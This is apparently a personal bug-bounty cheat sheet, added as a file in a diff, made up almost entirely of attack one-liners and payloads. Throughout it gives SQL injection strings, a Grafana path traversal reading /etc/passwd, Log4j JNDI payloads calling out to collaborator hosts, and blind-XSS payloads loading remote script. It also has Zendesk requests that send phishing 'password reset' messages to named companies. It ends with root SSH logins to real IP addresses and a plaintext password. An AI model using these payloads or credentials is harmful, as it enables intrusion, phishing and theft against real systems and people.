@@ -1,0 +1,175 @@
+#FILE OR DIRECTORY BRUTEFORCING
+
+cat domain | httpx -random-agent -x GET,POST -tech-detect -status-code  -title -silent --follow-redirects -mc 200
+
+# SUBDOMAIN SCANNER
+
+#SQL INJECTION
+
+')) or sleep(5)='
+;waitfor delay '0:0:100'--
+);waitfor delay '0:0:100'--
+';waitfor delay '0:0:100'--
+";waitfor delay '0:0:100'--
+');waitfor delay '0:0:100'--
+");waitfor delay '0:0:100'--
+));waitfor delay '0:0:100'--
+
+admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc
+
+echo "mwbsys.com" | while read LINE; do curl -s "https://rapiddns.io/subdomain/$LINE?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u | anew >> domains;curl -s https://dns.bufferover.run/dns?q=.$LINE |jq -r .FDNS_A[]|cut -d',' -f2|sort -u >> domains;curl -s "https://riddler.io/search/exportcsv?q=pld:$LINE" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> domains;curl -s "https://securitytrails.com/list/apex_domain/$LINE" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".$LINE" | sort -u >> domains;subfinder -d $LINE -silent | sort -u >> domains; assetfinder -subs-only $LINE | sort -u >> domains;findomain -t $LINE -q | sort -u >> domains;amass enum -passive -d $LINE | sort -u >> domains;done;
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: smule.zendesk.com' -H $'Content-Type: application/json' -H $'Content-Length: 241' \
+    --data-binary $'\x0d\x0a{\"request\":{\"requester\":{\"name\":\"RESET PASSWORD\",\"email\":\"arezthehopebuster@gmail.com\"},\"subject\":\"RESET PASSWORD\",\"comment\":{\"body\":\"Your Password Has Been Change Please Visit This Link For Reset Your Password https://www.salawaku.com\"}}}' \
+    $'https://smule.zendesk.com/api/v2/requests.json'
+
+#BRUTEFORCE SUBDOMAIN
+ffuf -u https://FUZZ.rootdomain -w /home/arezthehopebuster/Desktop/pentest/Wordlist/dx -v | grep "| URL |" | awk '{print $4}'
+
+#BRUTEFORCE
+cat domains | httpx -silent | while read line;do ffuf -x http://127.0.0.1:8080 -u $line/FUZZ -w /home/arezthehopebuster/Desktop/pentest/Wordlist/dx -v | grep "| URL |" | awk '{print $4}';done
+
+
+#GREP FILE EXTENSION
+
+grep -E "\.json(?:onp?)?$" | anew 
+
+
+#GRAFANA
+http.html_hash:-1388674681
+/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+
+#ZENDESK MAIL SPOOFING
+
+POST /api/v2/requests.json HTTP/1.1
+Host: insolar.zendesk.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=utf-8
+Content-Length: 235
+Origin: https://wallet.test.insolar.io
+Connection: close
+Referer: https://wallet.test.insolar.io/settings
+
+
+{"request":{"requester":{"name":"RESET PASSWORD","email":"arezthehopebuster@gmail.com"},"subject":"RESET PASSWORD","comment":{"body":"Your Password Has Been Change Please Visit This Link For Reset Your Password https://www.salawaku.com"}}}
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: smule.zendesk.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json;charset=utf-8' -H $'Content-Length: 241' -H $'Origin: https://wallet.test.insolar.io' -H $'Connection: close' -H $'Referer: https://wallet.test.insolar.io/settings' \
+    --data-binary $'\x0d\x0a{\"request\":{\"requester\":{\"name\":\"RESET PASSWORD\",\"email\":\"arezthehopebuster@gmail.com\"},\"subject\":\"RESET PASSWORD\",\"comment\":{\"body\":\"Your Password Has Been Change Please Visit This Link For Reset Your Password https://www.salawaku.com\"}}}' \
+    $'https://smule.zendesk.com/api/v2/requests.json'
+
+
+#SQLi
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'  <== concat string
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+
+
+#NUCLEISCANNER
+
+cat domains | httprobe | nuclei -t ~/nuclei-templates/ -o results.txt
+
+#DIRECTORY BRUTEFORCE 
+
+echo "https://flip.id"| dirdar  -only-ok -err -wl /home/arezthehopebuster/Desktop/pentest/Wordlist/dx
+
+
+#LOG4J
+
+${jndi:ldap://gau8wz9w8gda5fgwlflu4o14evkm8b.burpcollaborator.net}
+
+httpx -H 'User-Agent: ${jndi:ldap://swsi34rikdxyvpl3fdgyb9qg177xvm.burpcollaborator.net/${java:version}}' -x GET,POST,PUT -tech-detect -status-code  -title -silent -http-proxy http://127.0.0.1:8080 -path '/x?=${jndi:ldap://swsi34rikdxyvpl3fdgyb9qg177xvm.burpcollaborator.net/${java:version}}' -H 'X-Client-IP: 127.0.0.1' -H 'X-rewrite-url: /x?=${jndi:ldap://swsi34rikdxyvpl3fdgyb9qg177xvm.burpcollaborator.net/${java:version}}' -H ' X-Original-URL: /x?=${jndi:ldap://swsi34rikdxyvpl3fdgyb9qg177xvm.burpcollaborator.net/${java:version}}' -web-server -cname
+
+
+httpx -H 'User-Agent: ${${::-${::-$${::-j}}}}' -x GET,POST,PUT -tech-detect -status-code  -title -silent -http-proxy http://127.0.0.1:8080 -path '/text?=${${::-${::-$${::-j}}}}' -web-server -cname
+
+626l4qhnr2y6kjgivxomzkzl2c8gw5.burpcollaborator.net/${jndi:ldap://swsi34rikdxyvpl3fdgyb9qg177xvm.burpcollaborator.net/${java:version}}
+
+${${::-${::-$${::-j}}}}
+
+${{}}
+
+#WEB CACHE POISIONING
+
+httpx --status-code -silent -http-proxy http://127.0.0.1:8080 -silent -mc 301 -path '/?hackerone=${jndi:ldap://x${hostName}.L4J.aze4cv9fybqbum9ixgmu0ezjd.canarytokens.com/a}' -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.aze4cv9fybqbum9ixgmu0ezjd.canarytokens.com/a}'
+
+
+$LOG4J2
+
+%24%7Bjndi:ldap://%24%7BhostNAme%7DXXXX%24%7B::-,%7DL4J.aze4cv9fybqbum9ixgmu0ezjd.canarytokens.com%7Dzzz
+
+#HOSTHEADER
+
+echo "caffeine.tv" | httpx -silent | getJS --complete | httpx -random-agent -silent -H 'x-forwarded-scheme: http' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Forwarded-For-Host: 127.0.0.1'  -title --status-code -path "?hackerone=123"
+
+getJS --complete | httpx -random-agent -silent -H 'x-forwarded-scheme: http' -http-proxy http://127.0.0.1:8080  -title --status-code -path "?hackerone=123"
+
+echo "caffeine.tv" | httpx -silent | getJS --complete | httpx -random-agent -silent -H 'x-forwarded-scheme: http' -title --status-code -path "?hackerone=123" -http-proxy http://127.0.0.1:8080 -follow-redirects
+
+\"a'-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\"@a.com
+\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\"@a.com
+\"a'-IF(LENGTH(database())>9,SLEEP(7),0)or'1'='1\"@a.com
+
+#LOG4J
+
+cat domains | while read line; do python3 log4j-scan.py -u $line --run-all-test --waf-bypass  --custom-dns-callback-host kbzbg248h3kezlcr7ggzf5mo4fa5yu.burpcollaborator.net;done
+
+
+#Log4JScanner
+
+
+cat domains | httpx -silent -x ALL | while read line;do python3 log4j-scan.py -u $line -p http://127.0.0.1:8080 --custom-dns-callback-host krhssly3e5zhuymiq0zmsjt14.canarytokens.com --waf-bypass --run-all-tests; done
+
+
+
+Referer : ?</script>"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXJlenRoZWhvcGVidXN0ZXIueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>${{&*7}}
+
+
+
+?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
+"><script src=https://arezthehopebuster.xss.ht></script>
+
+
+#DIRCANNER
+
+cat ~/Desktop/pentest/Wordlist/dx | while read line;do httpx -l domains -path "/$line" -threads 100 -random-agent -x ALL -tech-detect -status-code -follow-redirects -title -silent -http-proxy http://127.0.0.1:8080;done
+
+
+#GETJS
+echo trello.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+
+#SSTI
+
+text{{22*22}}%0a%0d$22*22}%0a%0d${22*22}}%0a%0d<%= &8& %>%0a%0d#{22*22}
+
+22*22
+
+
+
+ssh root@8.215.72.8 -p 22
+ssh root@47.74.87.247 -p 22
+ssh root@8.208.78.131 -p 22
+
+
+pwd: H4tuH@H@123 
+
+
+
